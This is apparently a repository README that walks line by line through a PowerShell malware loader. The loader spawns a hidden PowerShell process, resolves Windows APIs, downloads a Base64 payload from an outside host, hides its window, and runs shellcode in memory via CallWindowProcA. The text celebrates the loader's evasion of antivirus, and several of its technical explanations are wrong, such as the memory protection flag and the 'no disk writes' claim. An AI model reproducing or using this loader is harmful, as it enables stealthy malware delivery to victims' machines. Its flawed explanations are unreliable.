# PowerShell-Loader

**🚀 Exploring PowerShell Memory Loader Techniques 🚀**

▶️Let's get back the PowerShell script that showcases advanced memory loading techniques. This script downloads, decodes, and executes a payload in memory, all while staying stealthy. We will walk through each line of code, explaining how it works, step by step. 🌶

Environment Setup 👩‍💻

The script begins by setting up the environment to ensure compatibility and persistence.

$powershell_path = $env:windir + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
$command_line_args = ((Get-WmiObject win32_process -Filter "ProcessId=$PID").CommandLine) -split '"'
$script_argument = $command_line_args[$command_line_args.Length - 2]
$is_64bit = ([IntPtr]::Size -eq 8)
if (-not $is_64bit) { $powershell_path = "powershell.exe" }
$is_valid_context = ($odontoclast -or $is_64bit)
$user_profile = $env:userprofile

🟠$env:windir + "\syswow64\WindowsPowerShell\v1.0\powershell.exe": Finds the PowerShell executable, defaulting to the 64-bit version. 📂
🟠Get-WmiObject win32_process -Filter "ProcessId=$PID": Grabs the command-line arguments of the current process to extract $script_argument for persistence. 📹
🟠[IntPtr]::Size -eq 8: Checks if the system is 64-bit, adjusting $powershell_path to powershell.exe for 32-bit systems. 🔍
🟠$odontoclast -or $is_64bit: Uses a flag (likely set in a prior stage) to determine if execution should proceed. 🧩
🟠$env:userprofile: Gets the user’s profile directory (e.g., C:\Users\Username) for later use. 🏠

Persistence via Process Spawning 🔄

If conditions are met, the script launches a new PowerShell process to maintain execution.
```
if ($is_valid_context) {
    $quoted_argument = '"' + $script_argument + '"'
    while (-not $shell_application) {
        $shell_type = [Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
        $shell_instance = [System.Activator]::CreateInstance($shell_type)
        $shell_application = $shell_instance.Item()
        if (-not $shell_application) { $placeholder = ''; $shell_application = $shell_instance.Item(0) }
        if (-not $shell_application) { Start-Process "explorer.exe"; Start-Sleep 1 }
    }
    $shell_application.Document.Application.ShellExecute($powershell_path, $quoted_argument, $user_profile, $null, 0)
    exit
}
```
🟠if ($is_valid_context): Proceeds if the system is 64-bit or $odontoclast is true (likely from an earlier stage). 
🟠$quoted_argument = '"' + $script_argument + '"': Quotes the extracted argument for safe passing. 
🟠[Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"): Gets the Shell.Application COM object using its CLSID.
🟠while (-not $shell_application): Loops until the COM object is initialized, falling back to Item(0) or launching explorer.exe to ensure a shell environment. 
🟠ShellExecute($powershell_path, $quoted_argument, $user_profile, $null, 0): Spawns a new PowerShell process with the argument in the users profile directory, hiding the window (0).
🟠exit: Terminates the current script after spawning the new process.

Native API Access Functions ⚙️

The script defines functions to interact with Windows APIs directly, enabling low-level operations.
```
function Get-FunctionPointer {
    param ([string]$dll_name, [string]$function_name)
    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
    $kernel32_module = $kernel32_handle.GetMethod("GetModuleHandle").Invoke($null, @($dll_name))
    $method = $kernel32_handle.GetMethod("GetProcAddress", [Type[]] @("System.Runtime.InteropServices.HandleRef", "string"))
    return $method.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $kernel32_module)), $function_name))
}
function Create-Delegate {
    param ([Parameter(Position = 0)] [Type[]]$parameter_types, [Parameter(Position = 1)] [Type]$return_type = [Void])
    $assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), "Run")
    $module = $assembly.DefineDynamicModule("InMemoryModule", $false)
    $delegate_type = $module.DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])
    $method = $delegate_type.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $return_type, $parameter_types)
    $method.SetImplementationFlags("Runtime, Managed")
    return $delegate_type.CreateType()
}
```
🟠Get-FunctionPointer: Loads a DLL (e.g., kernel32) and retrieves a function’s address using GetModuleHandle and GetProcAddress.
🟠Create-Delegate: Dynamically creates a .NET delegate for a native function, specifying parameter and return types. This allows PowerShell to call APIs like VirtualAlloc.
🟠These functions enable direct memory manipulation and execution, bypassing standard PowerShell cmdlets.

Payload Download and Decoding 📥
The script fetches and prepares an external payload.
```
$download_path = 'Opsamlingscirkulrerne.Oxy'
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
$web_client = New-Object System.Net.WebClient
$web_client.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/14.0'
$payload_url = "http://kerisel.fr/js/Ovenanfrt.mix"
$web_client.DownloadFile($payload_url, $download_path)
$downloaded_data = Get-Content $download_path
$payload_bytes = [System.Convert]::FromBase64String($downloaded_data)
```
🟠$download_path = 'Opsamlingscirkulrerne.Oxy': Sets a temporary file name for the downloaded payload. 
🟠[Net.ServicePointManager]::SecurityProtocol = 'Tls12': Ensures secure HTTPS connections.
🟠New-Object System.Net.WebClient: Creates a web client for downloading.
🟠$web_client.Headers['User-Agent'] = 'Mozilla/5.0...': Mimics a Firefox browser to avoid detection.
🟠DownloadFile($payload_url, $download_path): Downloads the payload from the specified URL to the temp file.
🟠Get-Content $download_path: Reads the file’s contents.
🟠[System.Convert]::FromBase64String($downloaded_data): Decodes the Base64 content into a byte array ($payload_bytes).

Stealth: Window Hiding 🕶

To avoid detection, the script hides its presence.
```
$zero = 0
$window_title = 'dyreklasser'
$Host.UI.RawUI.WindowTitle = $window_title
$target_process = (Get-Process | Where-Object { $_.MainWindowTitle -eq $window_title })
$window_handle = $target_process.MainWindowHandle
$show_window_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-FunctionPointer "user32" "ShowWindow"),
    (Create-Delegate @([IntPtr], [UInt32]) ([IntPtr]))
)
$show_window_delegate.Invoke($window_handle, $zero)
```
🟠$window_title = 'dyreklasser': Sets a benign console title. 
🟠$Host.UI.RawUI.WindowTitle = $window_title: Applies the title to the current process. 
🟠Get-Process | Where-Object { $_.MainWindowTitle -eq $window_title }: Finds the process with this title. 
🟠Get-FunctionPointer "user32" "ShowWindow": Gets the ShowWindow API function pointer. 
🟠Create-Delegate @([IntPtr], [UInt32]) ([IntPtr]): Creates a delegate for ShowWindow. 
🟠$show_window_delegate.Invoke($window_handle, $zero): Hides the process window using SW_HIDE (0).

Memory Allocation 💾

The script allocates memory for the payload.
```
$virtual_alloc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-FunctionPointer "kernel32" "VirtualAlloc"),
    (Create-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
)
$protect_memory_delegate = Get-FunctionPointer "ntdll" "NtProtectVirtualMemory"
$allocation_size1 = 12288
$allocation_size2 = 4
$protection_flag = 4
$memory_region1 = $virtual_alloc_delegate.Invoke($zero, 6974, $allocation_size1, $protection_flag)
$memory_region2 = $virtual_alloc_delegate.Invoke($zero, 45805568, $allocation_size1, $protection_flag)
```
🟠Get-FunctionPointer "kernel32" "VirtualAlloc": Gets the VirtualAlloc API pointer.
🟠Create-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]): Creates a delegate for VirtualAlloc.
🟠$protect_memory_delegate: Gets the NtProtectVirtualMemory pointer for memory protection.
🟠$allocation_size1 = 12288, $allocation_size2 = 4, $protection_flag = 4: Sets sizes and PAGE_EXECUTE_READWRITE (0x04) permissions.
🟠$virtual_alloc_delegate.Invoke($zero, 6974, $allocation_size1, $protection_flag): Allocates 6,974 bytes for the first region.
🟠$virtual_alloc_delegate.Invoke($zero, 45805568, $allocation_size1, $protection_flag): Allocates a large 45MB region.

Payload Injection and Execution

💉💉💉💉💉💉💉💉

The script loads and runs the payload in memory.
```
[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, $zero, $memory_region1, 6974)
[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, 6974, $memory_region2, (393989 - 6974))
$call_window_proc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-FunctionPointer "USER32" "CallWindowProcA"),
    (Create-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]))
)
$call_window_proc_delegate.Invoke($memory_region1, $memory_region2, $protect_memory_delegate, $zero, $zero)
```

🟠[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, $zero, $memory_region1, 6974): Copies the first 6,974 bytes to the small memory region.
🟠[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, 6974, $memory_region2, (393989 - 6974)): Copies the remaining 387,015 bytes to the large region.
🟠Get-FunctionPointer "USER32" "CallWindowProcA": Gets the CallWindowProcA API pointer.
🟠Create-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]): Creates a delegate for CallWindowProcA. 
🟠$call_window_proc_delegate.Invoke($memory_region1, $memory_region2, $protect_memory_delegate, $zero, $zero): Executes the first regions code (likely shellcode), passing the second region and memory protection function.

Connection to Earlier Stages 🔗

This script is part of a multi-stage process:

➡️Stage 0: Likely decodes configuration or flags (e.g., $odontoclast) using functions like Uninstructedness to process strings (e.g., 'LLL{LL 9LL.BLLLALLL0LLL5 ...'). 🧬
➡️Stage 1: Downloads and decodes the Base64 payload, producing $payload_bytes. 📥
➡️Stage 2: Executes the payload in memory, as shown above. 🚀

🔥🔥🔥 Why It is undetected and smart 🧠

This script uses:

▶️In-Memory Execution: Avoids disk writes to evade antivirus. 🕵️
▶️Native API Calls: Bypasses PowerShell’s standard cmdlets for stealth. ⚙️
▶️Base64 Decoding: Hides the payload in transit. 🔑
▶️Window Hiding: Keeps the process invisible to users. 👻
▶️Persistence: Spawns new processes to maintain execution. 🔄

This is a masterclass in PowerShell scripting for advanced memory operations. 🤓
